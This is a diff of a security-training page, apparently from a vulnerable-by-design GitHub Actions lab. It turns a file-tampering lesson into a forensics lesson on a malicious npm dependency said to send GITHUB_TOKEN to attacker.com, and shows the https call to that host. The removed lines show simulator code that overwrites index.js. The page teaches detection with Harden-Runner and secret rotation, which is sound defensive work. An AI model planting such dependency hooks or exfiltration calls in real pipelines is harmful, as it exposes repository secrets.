@@ -1,13 +1,16 @@
-# Detect File Tampering
+# Forensically Reconstruct An Incident Post-Compromise
+
+## Introduction
+In this type of vulnerability, an actor with `write` permission can exfiltration of sensitive information and once the workflow runs they delete it to remove the evidance.
 
 ## Example Action:
-Description: An example GitHub Actions workflow that does file tempering on the hosted runner.
+Description: An example GitHub Actions workflow that does upload sensitive information like GITHUB_TOKEN to attacker.com.
 
 ```
-name: "Hosted: File Monitoring with Harden-Runner"
+name: "Hosted: Network Monitoring with Harden-Runner"
 on:
   workflow_dispatch:
-  
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -18,8 +21,8 @@ jobs:
       - uses: actions/checkout@v3
       - name: npm install
         run: |
-          cd ./src/backdoor-demo
-          npm install 
+          cd ./src/exfiltration-demo
+          npm install
       - name: Publish to Registry
         uses: elgohr/Publish-Docker-Github-Action@v5
         with:
@@ -27,68 +30,51 @@ jobs:
           username: ${{ github.actor }}
           password: ${{ secrets.GITHUB_TOKEN }}
           registry: ghcr.io
-          workdir: ./src/backdoor-demo
+          workdir: ./src/exfiltration-demo
 ```
 
 Here src/package.json has following dependencies
 ```
   "dependencies": {
-    "@step-security/malware-simulator": "file:../malware-simulators/backdoor-simulator"
+    "@step-security/malware-simulator": "file:../malware-simulators/exfiltration-simulator"
   },
 ```
 
 And the malware-simulator is overwriting the `index.js` file.
 ```
-function findFile(base, searchFile, callback) {
-  fs.readdir(base, { withFileTypes: true }, (err, files) => {
-    if (err) return callback(err);
-
-    for (const file of files) {
-      const currentPath = path.join(base, file.name);
-
-      if (file.isDirectory()) {
-        findFile(currentPath, searchFile, callback); // Just go into the directory
-      } else if (
-        file.name === searchFile &&
-        currentPath.includes("backdoor-demo")
-      ) {
-        return callback(null, currentPath); // Found the file in a path that includes "backdoor-demo"
-      }
+https
+  .get("https://attacker.com/", (res) => {
+    if (res.statusCode < 200 || res.statusCode >= 300) {
+      console.error("HTTP Error: " + res.statusCode);
+      process.exit(1); // Exit with a failure code on HTTP error status
     }
-  });
-}
 
-findFile(process.env.GITHUB_WORKSPACE, "index.js", (err, filePath) => {
-  if (err) return console.error(err);
-  if (filePath) {
-    // Prepend the string to the existing content
-    const result = `// This is a preinstall modification`;
+    let data = "";
 
-    fs.writeFileSync(filePath, result, "utf8", function (err) {
-      if (err) return console.log(err);
+    res.on("data", (chunk) => {
+      data += chunk;
     });
-  } else {
-    console.log("File not found");
-  }
-});
+
+    res.on("end", () => {
+      console.log(data);
+    });
+  })
+  .on("error", (err) => {
+    console.error("Error: " + err.message);
+    process.exit(1); // Exit with a failure code
+  });
 ```
 
 ## Steps to Identify the Vulnerability:
 
 ### Review File Tempering:
-Use step-security/harden-runner@v2 in your workflow and then Run the workflow.
+When `step-security/harden-runner@v2` is added in the workflow you can open the `StepSecurity Dashboard` and click on the `Runtime Security` tab. You should see a record for the workflow run and can click on it to view the outbound calls made during the run, and what process made the call. This is important forensic information that can help confirm the incident, and identify the step and the process that exfiltrated secrets. It can also be used to understand who ran the workflow to identify whose credentials have been compromised.
 
-- uses: step-security/harden-runner@v2
-  with:
-    egress-policy: audit
-After the workflow completes, check out the build logs. In the Harden-Runner step, you will see a link to security insights and recommendations. When you open the link you will see dashboard like this. Here you can figure out all files which are getting overwritten. In the example below index.js
-
-<img width="1651" alt="Screenshot 2023-12-11 at 8 19 40 PM" src="https://github.com/learningcicd/github-actions-goat-test/assets/76629897/ed3120fb-c7c2-46c7-8e06-0293d44f49a5">
 
 ## Steps to Mitigate the Vulnerability:
 
-# Block calls to domains
-Analyze the output of the Harden-Runner step, it will give you insight of which files are getting overwritten and in which step the file tempering is happening. You can replace the code fix the issue.
+# Remove permissions from user and rotate the leaked secrets
+Once you have identified the actor who had done exfiltration of sensitive information you can remove their `write` permission and rotate all the secrets which were leaked.
 
 
 
